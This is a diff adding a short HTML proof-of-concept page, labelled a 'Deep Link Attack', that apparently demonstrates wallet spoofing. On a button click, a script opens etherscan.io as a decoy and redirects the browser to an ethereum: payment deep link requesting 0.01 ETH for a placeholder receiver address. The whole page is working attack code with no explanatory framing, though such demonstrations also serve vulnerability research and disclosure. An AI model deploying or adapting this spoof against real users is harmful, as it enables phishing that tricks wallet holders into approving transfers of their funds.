@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ethereum Deep Link Spoof</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <h2>Deep Link Attack</h2>
+
+  <button onclick="launchSpoof()">fake transaction</button>
+
+  <script>
+    function launchSpoof() {
+       setTimeout(async () => {
+      window.open("https://etherscan.io/")
+
+        }, 100);
+  
+      const receiver = '0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF';
+      const chainId = 1;
+      const value = '0x2386F26FC10000'; 
+
+      const deepLink = `ethereum:${receiver}@${chainId}?value=${value}`;
+      window.location.href = deepLink;
+    }
+  </script>
+</body>
+</html>
